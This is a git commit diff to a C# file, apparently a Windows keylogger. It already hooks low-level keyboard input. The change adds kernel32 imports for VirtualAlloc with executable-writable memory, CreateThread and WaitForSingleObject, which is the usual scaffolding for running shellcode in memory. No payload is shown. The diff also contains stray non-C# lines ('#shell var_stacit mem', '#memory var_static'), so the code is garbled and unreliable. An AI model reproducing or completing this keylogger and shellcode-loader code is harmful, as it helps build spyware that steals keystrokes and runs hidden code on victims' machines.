17f28cbf6ac62d75ab31bb09790fc95b2c5c64c7
guilhermesob <101477908+guilhermesob@users.noreply.github.com>
2023-07-24 12:23:23 -0300

    Update main.cs

--- main.cs
+++ main.cs
@@ -12,5 +12,15 @@ private static IntPtr SetHook(LowLevelKeyboardProc proc) {
 	}
 }
 
-#shell
+#shell var_stacit mem
 
+private static UInt32 MEM_COMMIT = 0x1000;
+private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;
+[DllImport("kernel32")]
+private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect);
+[DllImport("kernel32")]
+private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
+[DllImport("kernel32")]
+private static extern IntPtr CreateThread(UInt32 lpThreadAttributes,  UInt32 dwStackSize, UInt32 lpStartAddress, IntPtr param, UInt32 dwCreationFlags, ref UInt32 lpThreadId);
+
+#memory var_static
